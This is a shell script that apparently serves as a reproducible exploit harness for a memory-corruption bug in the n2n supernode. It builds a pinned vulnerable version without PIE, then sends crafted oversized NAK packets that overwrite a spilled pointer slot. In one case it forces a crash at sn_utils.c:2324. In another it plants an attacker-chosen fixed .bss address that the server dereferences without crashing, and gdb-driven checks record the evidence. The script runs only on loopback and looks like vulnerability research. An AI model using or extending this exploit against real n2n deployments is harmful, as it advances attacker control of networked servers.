#!/bin/sh
# W11 one-command replay: wire-only chosen pointer on a non-PIE clang -O2
# pinned vulnerable supernode. No debugger-supplied pointer value: the target
# is a fixed zeroed .bss address read from the binary's own symbols/bytes.
#   A: token_size=1700 with repeating chosen bytes -> SIGSEGV at sn_utils.c:2324
#   B: same wire with 8 chosen bytes at token+1682 (= nak+1696, the comm spill
#      slot) set to 0x42f3e8 -> comm is that address at :2324, all fields zero,
#      decode path survives to the end of the NAK case at sn_utils.c:2369.
# gdb observes; it never supplies the pointer value. Loopback only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
COMMUNITY=$N2N/provision/build/n2n-plain/community.list
SENDER=$HERE/w10_large_peer.py
EVID=$HERE/evidence
WORK=${TMPDIR:-/tmp}/n2n2shell-w11-replay.$$
BASE=${PORT_BASE:-19120}
TARGET=0x42f3e8
PASS=0
FAIL=0
mkdir -p "$WORK/src" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM
check() {
    if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1";
    else FAIL=$((FAIL+1)); echo "FAIL $1"; fi
}

tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
cp "$COMMUNITY" "$SRC/community.list" || exit 1
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-g -O2 -fno-omit-frame-pointer -no-pie" \
    LDFLAGS="-no-pie" ./configure &&
    make -j4 supernode) >"$EVID/w11-replay-build.log" 2>&1
check 01-non-pie-clang-o2-build "$?"
[ -x "$SRC/supernode" ] || { echo "RESULT $PASS PASS / $FAIL FAIL"; exit 1; }
nm -n "$SRC/supernode" | grep -q ' b previously_issued_time_stamp$'
check 02-fixed-bss-symbol "$?"

gdb_case() {
    label=$1 port=$2 override=$3 probe=${4:-}
    cmd=$WORK/gdb-$label.txt
    cat >"$cmd" <<EOF
set pagination off
set confirm off
set disable-randomization on
break sn_utils.c:2324
break sn_utils.c:2369
run -f -p 127.0.0.1:$port -t $((port+1)) -c community.list -F labfed -M
printf "W11_AT_DEREF comm="
p comm
printf "W11_TARGET_FIELDS\n"
x/3xb (char *)$TARGET+20
x/gx (char *)$TARGET+72
continue
printf "W11_AFTER_CONTINUE\n"
bt 3
printf "W11_DONE\n"
kill
quit
EOF
    (cd "$SRC" && timeout 40 gdb -q -batch -x "$cmd" ./supernode) \
        >"$EVID/w11-replay-$label.log" 2>&1 &
    gp=$!
    sleep 5
    if [ -n "$override" ]; then
        python3 "$SENDER" "$port" "$((port+10))" 1700 "$override" \
            >"$EVID/w11-replay-$label-sender.log" 2>&1
    else
        python3 "$SENDER" "$port" "$((port+10))" 1700 \
            >"$EVID/w11-replay-$label-sender.log" 2>&1
    fi
    if [ -n "$probe" ]; then
        sleep 2
        python3 "$SENDER" "$port" "$probe" 48 \
            >"$EVID/w11-replay-$label-probe.log" 2>&1
    fi
    wait "$gp" 2>/dev/null || true
}

# C: plain build (no gdb) — liveness after the same wire-only pointer.
PBASE=$((BASE+60))
(cd "$SRC" && timeout 60 ./supernode -f -p 127.0.0.1:$PBASE \
    -t $((PBASE+1)) -c community.list -F labfed -M) \
    >"$EVID/w11-replay-plain.log" 2>&1 &
sp=$!
sleep 5
python3 "$SENDER" "$PBASE" "$((PBASE+10))" 1700 "1682:$TARGET" \
    >"$EVID/w11-replay-plain-attack.log" 2>&1
grep -q 'sent NAK len=1738' "$EVID/w11-replay-plain-attack.log"
check 11-plain-attack-sent "$?"
sleep 2
python3 "$SENDER" "$PBASE" "$((PBASE+12))" 48 \
    >"$EVID/w11-replay-plain-probe.log" 2>&1
grep -q 'REGISTER_SUPER reply len=' "$EVID/w11-replay-plain-probe.log"
check 12-live-after-chosen-pointer "$?"
grep -q 'FORWARDED len=86' "$EVID/w11-replay-plain-probe.log"
check 13-safe-forward-after-attack "$?"
if kill -0 "$sp" 2>/dev/null; then check 14-process-alive 0;
else check 14-process-alive 1; fi
kill "$sp" 2>/dev/null || true
wait "$sp" 2>/dev/null || true

# A: garbage chosen pointer in every spilled argument slot.
gdb_case garbage "$BASE" "" ""
grep -q 'Program received signal SIGSEGV' "$EVID/w11-replay-garbage.log"
check 03-garbage-sigsegv "$?"
grep -q 'sn_utils.c:2324' "$EVID/w11-replay-garbage.log"
check 04-garbage-fault-at-deref "$?"
grep -q 'W11_AT_DEREF comm=.*0x5a48494d5a48494d' "$EVID/w11-replay-garbage.log"
check 05-garbage-comm-is-chosen "$?"

# B: attacker-known fixed .bss address, no debugger-supplied pointer.
gdb_case fixed "$((BASE+20))" "1682:$TARGET"
grep -q 'override token+1682' "$EVID/w11-replay-fixed-sender.log"
check 06-wire-carried-fixed-pointer "$?"
grep -q "W11_AT_DEREF comm=.*$TARGET" "$EVID/w11-replay-fixed.log"
check 07-deref-reads-chosen-address "$?"
grep -A3 'W11_TARGET_FIELDS' "$EVID/w11-replay-fixed.log" | grep -q '0x00.*0x00.*0x00'
check 08-target-fields-zero "$?"
if grep -q 'Program received signal SIGSEGV' "$EVID/w11-replay-fixed.log"; then
    check 10-no-crash 1
else
    check 10-no-crash 0
fi


echo "RESULT $PASS PASS / $FAIL FAIL"
echo "RAW $EVID/w11-replay-*.log"
[ "$FAIL" -eq 0 ]
